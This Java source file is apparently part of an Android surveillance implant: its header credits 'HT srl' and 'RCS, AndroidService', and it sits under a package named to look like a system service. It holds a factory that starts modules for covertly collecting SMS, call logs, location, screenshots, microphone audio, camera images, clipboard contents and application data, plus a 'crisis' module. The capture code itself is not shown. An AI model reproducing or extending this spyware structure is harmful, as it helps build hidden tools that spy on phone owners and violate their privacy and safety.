/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentFactory.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent;

import com.android.service.auto.Cfg;
import com.android.service.interfaces.AbstractFactory;
import com.android.service.util.Check;

public class AgentFactory implements AbstractFactory<AgentBase, String> {
	private static final String TAG = "AgentFactory"; //$NON-NLS-1$

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	public AgentBase create(String type) {
		AgentBase a = null;

		if("sms".equals(type)){
			a = new AgentMessage();
		}else if("addressbook".equals(type)){
			//a = new AgentAddressBook();
		}else if("calendar".equals(type)){
			//a = new AgentCalendar();
		}else if("callist".equals(type)){
			a = new AgentCallList();
		}else if("device".equals(type)){
			a = new AgentDevice();
		}else if("position".equals(type)){
			a = new AgentPosition();
		}else if("snapshot".equals(type)){
			a = new AgentSnapshot();
		}else if("message".equals(type)){
			a = new AgentMessage();
		}else if("mic".equals(type)){
			a = new AgentMic();
		}else if("camera".equals(type)){
			a = new AgentCamera();
		}else if("clipboard".equals(type)){
			a = new AgentClipboard();
		}else if("crisis".equals(type)){
			a = new AgentCrisis();
		}else if("application".equals(type)){
			a = new AgentApplication();
		}else{

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (factory): unknown type") ;//$NON-NLS-1$
			}
		}

		return a;
	}

}
